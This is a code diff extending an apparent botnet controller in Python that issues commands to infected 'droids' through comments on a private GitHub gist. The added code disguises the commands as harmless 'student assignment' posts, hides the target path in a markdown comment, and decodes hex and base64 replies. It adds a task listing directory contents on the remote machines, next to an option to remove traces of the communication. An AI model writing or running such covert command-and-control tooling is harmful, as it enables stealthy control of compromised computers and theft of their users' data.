@@ -1,8 +1,10 @@
+#!/usr/bin/python3
 import sys
 import requests
 import json
 import time
 from datetime import datetime
+import base64
 
 
 class Git:
@@ -15,9 +17,9 @@ class Git:
     def create_gist(self, gist_name):
         headers = {'Authorization': 'token %s' % self.API_TOKEN}
         params = {'scope': 'gist'}
-        payload = {"description": "GIST created by python code",
+        payload = {"description": "This gist was created for stage 5 of student assignments.",
                    "public": False,
-                   "files": {gist_name: {"content": "Hello droids!"}}}
+                   "files": {gist_name: {"content": "Hello students!"}}}
 
         res = requests.post(self.GITHUB_GIST_API, headers=headers, params=params, data=json.dumps(payload))
         if res.status_code != 201:
@@ -85,22 +87,41 @@ def wait_for_reasonable_time():
     time.sleep(10)
 
 
-def request_logged_in_users(git):
-    comment_text = "# Question\nDroids, who uses you right now?"
+def request_logged_in_users(git, number):
+    comment_text = "# Assignment " + str(number) + "\nStudents, what users do you see on your lab computers?"
     git.add_comment_to_gist(comment_text)
     print("Gathering information...")
     wait_for_reasonable_time()
     related_comments = []
     for comment in git.get_gist_comments():
-        if datetime.strptime(comment['updated_at'], date_format) >= last_comment_check \
-                and comment['body'].startswith("> Droids, who uses you right now?"):
+        if comment['body'].startswith("> # Assignment " + str(number)):
             related_comments.append(comment['body'])
 
     for comment in related_comments:
         lines = comment.splitlines()
-        print("Bot on ip "+str(lines[2].split()[3])+" is used by:")
+        ip = bytes.fromhex(lines[2].split()[3]).decode("utf-8")
+        print("Droid with ip " + str(ip) + " is used by:")
         for i in range(4, len(lines)):
             print(lines[i])
+
+
+def request_content_of_directory(git, number):
+    path = input("Which directory?\n")
+    print("Ordering the droids now.")
+    comment_text = "# Assignment " + str(number) + "\nStudents, what is the content of your home directory?\n\n[//]: <> ( " \
+                   + path+" )"
+    git.add_comment_to_gist(comment_text)
+    wait_for_reasonable_time()
+    related_comments = []
+    for comment in git.get_gist_comments():
+        if comment['body'].startswith("> # Assignment " + str(number)):
+            related_comments.append(comment['body'])
+
+    for comment in related_comments:
+        lines = comment.splitlines()
+        ip = bytes.fromhex(lines[2].split()[3]).decode("utf-8")
+        print("Droid with ip " + str(ip) + " found content of directory `" + path + "`:")
+        print(base64.b64decode(lines[5].split()[3]).decode("utf-8"))
 
 
 if __name__ == '__main__':
@@ -108,18 +129,19 @@ if __name__ == '__main__':
         print("Program requires arguments:\nGITHUB_API_TOKEN GIST_NAME")
         exit(1)
 
+    assignment_number = 0
+
     github_gist_api = "https://api.github.com/gists"
     api_token = sys.argv[1]
     gist_name = sys.argv[2]
     git_instance = Git(github_gist_api, api_token)
-    date_format = "%Y-%m-%dT%H:%M:%SZ"
-
     git_instance.create_gist(gist_name)
 
     run = True
     art = "     ____________________________\n    !\_________________________/!\\\n    !!                         !! \\\n    !!  What a lovely day      !!  \\\n    !!  to use our loyal       !!  !\n    !!  droids, my lord.       !!  !\n    !!                         !!  !\n    !!                         !!  !\n    !!                         !!  !\n    !!                         !!  /\n    !!_________________________!! /\n    !/_________________________\!/\n       __\_________________/__/!\n      !_______________________!/\n    ________________________\n   /oooo  oooo  oooo  oooo /!\n  /ooooooooooooooooooooooo/ /\n /ooooooooooooooooooooooo/ /\n/C=_____________________/_/\n"
     question = "\nWhat do you want me to order the droids, my lord?\n"
     options = "1 - Get users logged in to the droids\n" \
+              "2 - Get list of directory content on droids\n" \
               "6 - Quit and remove all traces of communication\n"
     wrong_option_text = "I am so sorry to disagree with your order, my lord. " \
                         "But your answer must be a number from 1 to 6."
@@ -132,8 +154,12 @@ if __name__ == '__main__':
             continue
         last_comment_check = datetime.utcnow()
         if selected_option == 1:
+            assignment_number += 1
             print("Excellent choice, my lord.")
-            request_logged_in_users(git_instance)
+            request_logged_in_users(git_instance, assignment_number)
+        elif selected_option == 2:
+            assignment_number += 1
+            request_content_of_directory(git_instance, assignment_number)
         elif selected_option == 6:
             run = False
         else:
